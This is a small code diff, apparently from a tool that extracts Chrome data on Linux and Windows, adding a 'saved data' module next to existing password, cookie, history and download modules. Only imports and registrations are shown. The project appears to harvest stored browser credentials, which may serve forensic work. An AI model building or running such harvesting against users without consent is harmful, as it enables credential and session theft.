@@ -11,6 +11,7 @@ from modules.windows.chrome.password import WindowsChromePassword
 from modules.windows.chrome.history import WindowsChromeHistory
 from modules.windows.chrome.download import WindowsChromeDownload
 from modules.windows.chrome.cookie import WindowsChromeCookie
+from modules.windows.chrome.saved_data import WindowsChromeSavedData
 
 modules = [
 		LinuxChromeCookie(),
@@ -22,6 +23,7 @@ modules = [
 		WindowsChromeHistory(),
 		WindowsChromeDownload(),
 		WindowsChromeCookie(),
+		WindowsChromeSavedData(),
 	]
 
 
